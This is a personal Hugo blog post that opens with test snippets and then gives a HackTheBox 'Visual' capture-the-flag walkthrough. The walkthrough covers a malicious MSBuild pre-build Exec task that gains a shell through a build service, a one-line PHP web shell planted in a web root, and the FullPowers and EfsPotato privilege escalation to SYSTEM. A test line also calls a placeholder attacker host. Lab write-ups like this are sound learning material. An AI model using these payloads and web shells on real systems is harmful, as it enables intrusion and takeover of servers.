---
date: 2025-03-25T17:29:31-07:00
description: "This is a test post. where will this show up?"
# image: ""
lastmod: 2025-03-25
showTableOfContents: false
# tags: ["",]
title: "My First Post"
type: "post"
---

## This is my first time using Hugo i think?

I think its pretty cool, just need to figure out how to do things

```python
import requests

x = requests.get("https://attacker-ip/IP")
print(vars(x))
```

Or we can do it in bash?

```sh
bebop831@bma ~/D/bebop-site-hugo> id
uid=501(bebop831) gid=20(staff) groups=20(staff),101(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
```

# Visual Machine Walkthrough (HackTheBox)

## Sections
- [Introduction 🖥️](#introduction)
- [Scanning/Enum 🔍](#scanningenum)
- [Foothold 🆗](#foothold)
- [Pivot 💃🏽](#pivot)
- [System 🪙](#system)
- [Resources 📘](#resources)

---

## Introduction 🖥️

Visual is a 2019 Windows Server, vulnerable to remote code execution through a misconfigured VS compilation service. After gaining initial access, users can pivot to the service account of the locally running web server. Once full privileges have been restored, users can perform a token impersonation attack via the EFS Potato exploit.

![Visual Machine](https://www.hackthebox.com/machines/visual)

*Source: [Hackthebox](https://www.hackthebox.com/machines/visual)*

---

## Scanning/Enum 🔍

Begin with a port scan:

```bash
$ nmap -T4 -A -p- 10.10.11.234
```

**Scan breakdown:**
- `-T4`: Fast timing template, not stealthy.
- `-A`: OS Detection, Version Detection, Script Scanning, traceroute.
- `-p-`: Scan all ports.

After scanning, the only open service is Apache web server on port 80.

![Nmap Scan Result](https://bebop831.com/static/assets/Visual/img/nmap.png)

### Port 80, HTTP 🌎

The website provides a compilation service for Visual Studio projects.

![HTTP Page](https://bebop831.com/static/assets/Visual/img/HTTP1.png)
![HTTP Compilation](https://bebop831.com/static/assets/Visual/img/HTTP2.png)
![Build Success](https://bebop831.com/static/assets/Visual/img/success_build.png)

The server clones and builds projects from a provided git repository. This can be exploited via malicious MSBuild Tasks.

**Resources for exploiting MSBuild:**
- [Quick Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html)
- [MSBuild 101](https://www.creepingcoder.com/2020/06/01/msbuild-101-using-the-exit-code-from-a-command/)
- [Exec Task MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-task-reference?view=vs-2022)

---

## Foothold 🆗

Create a malicious Git repo with:

**hackme.sln**

```plaintext
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.29509.3
MinimumVisualStudioVersion = 10.0.40219.1

Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "hackme", "hackme.csproj", "{fdbe3b6d-8bd0-4f11-9ef9-7b3ac7c06f23}"
EndProject

Global
...
EndGlobal
```

**hackme.csproj**

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>

  <Target Name="CustomPreBuild" BeforeTargets="BeforeBuild">
    <Exec Command=".\booty.exe" />
    <!-- Malicious payload command here -->
  </Target>
</Project>
```

Prepare your git repo:

```bash
cd .git/
git --bare update-server-info
mv hook/post-update.sample hooks/post-update
python3 -m http 80
```

Upon submission, gain a shell as `visual\enox`.

![Foothold](https://bebop831.com/static/assets/Visual/img/foothold.png)

---

## Pivot 💃🏽

Inspecting further, pivot via the XAMPP Apache server:

Create a PHP backdoor:

```bash
echo "<?php system($_GET['cmd']); ?>" > C:\xampp\htdocs\cmd.php
```

Execute commands via `http://10.10.11.234/cmd.php?cmd=<cmd>`

![PHP Backdoor](https://bebop831.com/static/assets/Visual/img/cmd_php.png)

Gain access as `local service`.

---

## System 🪙

Restore service account privileges using [FullPowers](https://github.com/itm4n/FullPowers):

![FullPowers](https://bebop831.com/static/assets/Visual/img/full_powers.png)

Compile and run [EFS Potato](https://github.com/zcgonvh/EfsPotato.git):

Locate C# compiler:

```bash
where /R C:\ "csc.exe"
```

Compile:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe EfsPotato.cs
```

Run exploit:

```bash
.\EfsPotato.exe <cmd>
```

Privilege escalation to `nt authority\system`.

![EFS Potato](https://bebop831.com/static/assets/Visual/img/efspotato.png)

Retrieve flag from `C:\Users\Administrator\Desktop\root.txt`.

---

## Resources 📘

- [Quick Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html)
- [MSBuild 101](https://www.creepingcoder.com/2020/06/01/msbuild-101-using-the-exit-code-from-a-command/)
- [SLN, CSPROJ, VXPROJ Files Explained](https://chat.openai.com/share/df65e56c-a0ab-45ec-a4f0-3175f123cda6)


